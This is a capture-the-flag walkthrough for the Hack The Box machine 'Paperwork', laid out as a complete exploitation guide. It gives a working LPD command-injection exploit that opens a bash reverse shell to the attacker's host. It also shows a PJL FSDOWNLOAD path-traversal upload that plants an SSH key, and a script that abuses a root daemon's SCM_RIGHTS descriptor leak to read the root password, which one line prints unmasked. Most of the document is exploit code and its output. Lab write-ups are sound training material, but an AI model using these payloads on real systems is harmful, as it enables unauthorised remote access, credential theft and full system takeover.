# 🚀 HTB Paperwork - Complete Exploitation Guide

```
██████╗  █████╗ ██████╗ ███████╗██████╗ ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
██████╔╝███████║██████╔╝█████╗  ██████╔╝██║ █╗ ██║██║   ██║██████╔╝█████╔╝ 
██╔═══╝ ██╔══██║██╔══██╗██╔══╝  ██╔══██╗██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
██║     ██║  ██║██║  ██║███████╗██║  ██║╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
```

---

## 📋 Machine Information

| Property | Value |
|:---|:---|
| **Machine Name** | Paperwork |
| **Difficulty** | Easy |
| **Target Ports** | 80 (HTTP), 1515 (LPD), 9100 (JetDirect) |

---

## 🔍 Reconnaissance

### Port Scanning

```bash
nmap -p- --min-rate 10000 <IP>
nmap -p 22,80,1515,9100 -sC -sV <IP>
```

### Web Enumeration

Add to `/etc/hosts`:

```bash
echo "<IP> paperwork.htb" | sudo tee -a /etc/hosts
```

Browse to `http://paperwork.htb` - discovered:
- **Target Queue:** `archive_intake`
- **Internal Processor:** `/download/archive`
- **Protocol:** RFC 1179 (LPD)

---

## 🛠️ Stage 1: LPD Service Exploitation (Initial Foothold)

### Vulnerability

The LPD service (`/opt/LPDServer/server.py`) contains an RCE vulnerability where the `job_name` from the control file is passed unsanitized to `subprocess.Popen` with `shell=True`.

### Exploit - Reverse Shell

```bash
# Start listener first!
nc -lvnp 4444

# Run exploit
python3 -c "
import socket, time
sock = socket.socket()
sock.connect(('<IP>', 1515))
sock.send(b'\x02archive_intake\n')
time.sleep(0.3)
sock.recv(1024)
job = \"J; bash -c \\\"bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1\\\" #\n\"
header = b'\x02' + str(len(job)).encode() + b'\n'
sock.send(header)
time.sleep(0.3)
sock.recv(1024)
sock.send(job.encode())
time.sleep(0.3)
sock.recv(1024)
sock.send(b'\x03\x00\n')
time.sleep(1)
sock.close()
print('[+] Done!')
"
```

### Result

```
lp@paperwork:/opt/LPDServer$
```

### LPD Protocol Breakdown

| Step | Action |
|:---|:---|
| 1 | `\x02 + queue_name + \n` → Select queue |
| 2 | Wait for `\x00` ACK |
| 3 | `\x02 + length + \n` → Header |
| 4 | `J;command; #\n` → Control file with payload |
| 5 | `\x03\x00\n` → Finalize |

---

## 🖥️ Stage 2: User Privilege Escalation (lp → archivist)

### Discovery

While enumerating as `lp`:

```bash
lp@paperwork:/opt/LPDServer$ netstat -tulpn | grep 9100
tcp 0 0 127.0.0.1:9100 0.0.0.0:* LISTEN 987/python3
```

### JetDirect Service Analysis

The service `/home/archivist/printer/jetdirect.py` runs on port 9100 with file upload capabilities via the `@PJL FSDOWNLOAD` command.

### Generate SSH Key

```bash
# On attacker machine
ssh-keygen -t ed25519 -f /tmp/paperwork_key -N ""
cat /tmp/paperwork_key.pub
# Output: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHWq4BmbOVcL3hzYC8J5...
```

### Upload SSH Key via JetDirect

```bash
# From lp shell
python3 -c "
import socket, time
KEY = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHWq4BmbOVcL3hzYC8J5...'
s = socket.socket()
s.connect(('127.0.0.1', 9100))
cmd = '@PJL FSDOWNLOAD NAME=\"../../../../home/archivist/.ssh/authorized_keys\" SIZE=' + str(len(KEY)) + '\r\n'
s.send(cmd.encode())
time.sleep(0.5)
s.send(KEY.encode())
time.sleep(2)
s.close()
print('[+] Key uploaded!')
"
```

### SSH as archivist

```bash
# On attacker machine
ssh -i /tmp/paperwork_key archivist@<IP>
```

### Result

```bash
archivist@paperwork:~$ cat user.txt
1fbc25849*****5286122d989
```

---

## 👑 Stage 3: Root Privilege Escalation (archivist → root)

### Discovery

Found a local UNIX management socket:

```bash
archivist@paperwork:~$ ps aux | grep root
root 1488 0.0 0.4 28432 17940 ? Ss 22:59 0:00 /usr/bin/python3 /usr/bin/paperwork-daemon
```

### Understanding the Vulnerability

`/usr/bin/paperwork-daemon` runs as root and:
- Reads `/etc/paperwork/admin_pins.conf`
- Sends file descriptors via `SCM_RIGHTS` on UNIX socket
- Checks for malicious keywords in `/home/archivist/printer/logs/commands.log`
- **Keywords:** `FSQUERY`, `FSUPLOAD`, `FSDOWNLOAD`

### Python Script - Get Root Credentials

```python
#!/usr/bin/env python3
import socket
import array
import os

def get_admin_password():
    # Trigger lockdown by adding malicious keyword
    with open("/home/archivist/printer/logs/commands.log", "a") as f:
        f.write("FSDOWNLOAD\n")
    
    # Connect to UNIX socket
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect("/run/paperwork/mgmt.sock")
    
    # Receive data with file descriptors
    msg, ancdata, _, _ = s.recvmsg(4096, socket.CMSG_LEN(8))
    print(f"[+] Message: {msg.decode()}")
    
    # Extract file descriptors
    for level, type_, data in ancdata:
        if level == socket.SOL_SOCKET and type_ == socket.SCM_RIGHTS:
            fds = array.array("i")
            fds.frombytes(data[:len(data) - (len(data) % 4)])
            print(f"[+] Received FDs: {list(fds)}")
            
            # FD 4 = commands.log, FD 5 = admin_pins.conf
            for fd in fds:
                os.lseek(fd, 0, os.SEEK_SET)
                content = os.read(fd, 1024).decode()
                print(f"FD {fd} content:\n{content}")
                if "ADMIN_PASSWORD" in content:
                    password = content.split("=")[1].strip()
                    print(f"\n[!] ADMIN_PASSWORD={password}")
                    return password
    
    s.close()

if __name__ == "__main__":
    get_admin_password()
```

### Execute the Script

```bash
archivist@paperwork:~$ python3 get_password.py
[+] Message: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
[+] Received FDs: [4, 5]
FD 4 content:
FSDOWNLOAD
FD 5 content:
ADMIN_PASSWORD=Appare******edar22

[!] ADMIN_PASSWORD=Appare******edar22
```

### Switch to Root

```bash
archivist@paperwork:~$ su -
Password: ApparelMortuaryCedar22
root@paperwork:~# whoami
root
```

### Root Flag

```bash
root@paperwork:~# cat root.txt
9cc798b69************10d2e16f55f3
```

---

## 📊 Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. LPD RCE (Port 1515)                                        │
│    └─> Shell as lp                                            │
├─────────────────────────────────────────────────────────────────┤
│ 2. JetDirect FSDOWNLOAD (Port 9100)                           │
│    └─> Upload SSH key → Shell as archivist                    │
├─────────────────────────────────────────────────────────────────┤
│ 3. Paperwork-daemon SCM_RIGHTS FD Leak                        │
│    └─> Leak /etc/paperwork/admin_pins.conf                    │
│    └─> ADMIN_PASSWORD=Appare******edar22                      │
├─────────────────────────────────────────────────────────────────┤
│ 4. su - root                                                  │
│    └─> Shell as root                                          │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🔧 Tools Used

| Tool | Purpose |
|:---|:---|
| **Nmap** | Port scanning |
| **Python3** | Exploit development |
| **SSH** | Remote access |
| **Netcat** | Reverse shell listener |
| **Tcpdump** | Traffic monitoring |

---

## 📝 Key Files

| File | Purpose |
|:---|:---|
| `/opt/LPDServer/server.py` | Vulnerable LPD service |
| `/home/archivist/printer/jetdirect.py` | JetDirect service |
| `/usr/bin/paperwork-daemon` | Root daemon with SCM_RIGHTS |
| `/etc/paperwork/admin_pins.conf` | Contains root password |
| `/home/archivist/printer/logs/commands.log` | Log file (malicious trigger) |

---

## 🚨 Important Notes

- **SSH Key:** Replace with your own generated key
- **Reset Machine:** If exploit fails, reset the machine on HTB
- **Port 1515:** If connection times out, machine may be down (reset)

---

## 📚 References

- RFC 1179 - Line Printer Daemon Protocol
- SCM_RIGHTS - Sending File Descriptors over UNIX Sockets
- CVE-2001-1583 - LPD Vulnerability
- PJL (Printer Job Language) - FSDOWNLOAD Command

---

**Happy Hacking! 🔥**
